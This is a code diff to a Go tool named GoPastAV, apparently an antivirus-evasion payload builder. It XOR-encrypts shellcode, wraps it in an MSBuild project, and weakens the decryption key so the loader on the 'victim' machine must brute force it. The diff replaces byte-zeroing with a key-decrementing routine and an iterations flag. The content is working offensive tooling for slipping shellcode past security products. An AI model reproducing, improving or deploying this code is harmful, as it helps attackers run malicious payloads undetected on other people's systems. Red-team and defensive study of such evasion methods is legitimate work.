@@ -1,6 +1,8 @@
 package main
 
 import (
+	"bytes"
+	"compress/gzip"
 	"crypto/sha256"
 	"flag"
 	"fmt"
@@ -8,22 +10,11 @@ import (
 	"math/rand"
 	"os"
 	"strings"
-	 "bytes"
 	"text/template"
 	"time"
-	"compress/gzip"
 )
 
-var version = "1.3"
-
-// Version 1.1 - 27/01/2021
-// 1.1 - Added output options for encrypted shellcode for MetroBishop
-
-//Version 1.2 - 07/02/2021
-// 1.2 - Output filename, flag for encrypted shellcode and number of key bits to remove for bruteforce
-
-//Version 1.2.1 10/02/2021
-// 1.2.1 - Fixed encrypt only bug
+var version = "1.4"
 
 type MSBuildPayload struct {
 	Payload string
@@ -70,28 +61,45 @@ func randStringBytes(n int) string {
 	return string(b)
 }
 
+func subtractFromByteArray(key []byte, value int) {
+	for ; value > 0; value-- {
+		index := len(key) - 1
+		for index >= 0 {
+			if key[index] > 0 {
+				key[index]--
+				break
+			} else {
+				key[index] = 255
+				index--
+			}
+		}
+	}
+}
+
 func main() {
 	fmt.Printf("GoPastAV %s by @aceb0nd\n", version)
 
 	var scFilename string
 	var codeFilename string
 	var outFilename string
-	var removeBytes int
+	var iterations int
 	var encryptOnly bool
 
 	flag.StringVar(&scFilename, "shellcode", "shellcode.bin", "Shellcode file to embed inside the MSBuild payload.")
 	flag.StringVar(&codeFilename, "code", "payload.cs", "C# source code filename that the MSBuild payload should execute.")
 	flag.StringVar(&outFilename, "outfile", "", "Output filename for the MSBuild project or encrypted shellcode.")
-	flag.IntVar(&removeBytes, "remove", 2, "The number of bytes to remove from the decryption key. A larger numbers increases the decryption brute force time.")
+	flag.IntVar(&iterations, "iterations", 100000, "The number of iterations the loader will need to perform to reach the correct decryption key.")
 	flag.BoolVar(&encryptOnly, "encryptOnly", false, "Output only the encrypted shellcode for another tool/project.")
 	flag.Parse()
 
 	if !fileExists(scFilename) {
 		fmt.Printf("[!] Cannot find shellcode file \"%s\"\n", scFilename)
+		flag.PrintDefaults()
 		os.Exit(1)
 	}
 	if !fileExists(codeFilename) && !encryptOnly {
 		fmt.Printf("[!] Cannot find C# code file \"%s\"\n", codeFilename)
+		flag.PrintDefaults()
 		os.Exit(1)
 	}
 
@@ -141,12 +149,11 @@ func main() {
 	encShellcode := xor(shellcode, key)
 	fmt.Println("Done")
 
-	// remove last X bytes of key as the victim will have to brute force this
-	fmt.Printf("[+] Removing last %d bytes of decryption key... ", removeBytes)
-	for i := 1; i < removeBytes; i++ {
-		key[len(key)-i] = 0
-	}
+	// decrement X times from the key as the victim will have to brute force this
+	fmt.Printf("[+] Decrementing %d from the decryption key... ", iterations)
+	subtractFromByteArray(key, iterations)
 	fmt.Println("Done")
+	//fmt.Printf("[+] Key: %v\n", formatBytes(key))
 
 	if encryptOnly {
 		fmt.Printf("[+] Writing encrypted shellcode to file... ")
@@ -161,14 +168,11 @@ func main() {
 		fmt.Println("Done")
 	} else {
 
-
 		// read C# code
 		fmt.Printf("[+] Reading C# code... ")
 		payloadCode, err := ioutil.ReadFile(codeFilename)
 		check(err)
 		fmt.Println("Done")
-
-
 
 		if outFilename == "" {
 			t := time.Now()
